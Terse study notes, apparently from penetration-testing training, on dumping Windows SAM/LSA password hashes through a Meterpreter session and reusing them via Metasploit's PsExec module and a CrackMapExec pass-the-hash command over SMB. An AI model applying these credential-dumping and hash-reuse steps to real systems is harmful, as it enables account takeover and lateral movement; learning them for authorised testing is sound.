metasploit PsExec modul
Crackmapexec
pgrepe lsass
migrate it 
lsa_dump_sam

- we will get hashes and copy it and exit session
- make new module psexec 
- we need LM and NTML hash to use with psexec module 
- we change the LPORT because it will be a new meterpter session and we will use the same payload 
- set target command 
- set target Native\\upload
another way is to use crackmapexec 
- crackmapexec smb IP -u admin -H "hash341039459185kjlfkasldkjfa" -x "whoami"